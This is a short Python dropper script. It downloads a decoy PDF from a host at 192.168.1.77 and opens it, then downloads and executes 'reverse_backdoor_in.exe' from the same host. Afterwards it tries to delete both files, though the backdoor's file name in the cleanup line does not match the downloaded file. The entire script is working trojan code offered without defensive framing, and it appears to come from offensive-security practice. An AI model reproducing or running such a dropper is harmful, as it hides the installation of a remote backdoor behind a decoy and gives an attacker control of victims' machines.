#!/usr/bin/env python

import requests, subprocess, smtplib, os, tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


temp_directory = tempfile.gettempdir()  # Get OS temp directory path
os.chdir(temp_directory)  # Change current directory to temp

download("http://192.168.1.77/evilFiles/d&d_playbook.pdf")
subprocess.Popen("d&d_playbook.pdf", shell=True)

download("http://192.168.1.77/evilFiles/reverse_backdoor_in.exe")
subprocess.call("reverse_backdoor_in.exe", shell=True)

os.remove("d&d_playbook.pdf")
os.remove("reverseBackdoor.exe")